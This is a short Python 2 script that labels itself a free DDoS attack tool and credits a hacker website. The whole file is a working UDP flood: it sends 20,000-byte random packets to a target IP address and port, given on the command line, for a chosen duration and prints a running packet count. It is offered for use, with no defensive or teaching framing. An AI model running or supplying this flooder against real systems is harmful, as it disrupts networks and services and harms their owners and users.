import time
import socket
import random
import sys
def usage():
    print "\033[1;32mFree DDoS Attack Python Script by Elite Hacker - id.elitehacker.site"
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mDDoS Attack of \033[1;32m%s \033[1;91mto \033[1;32m%s \033[1;91mport: \033[1;32m%s by Elite Hacker - id.elitehacker.site"%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
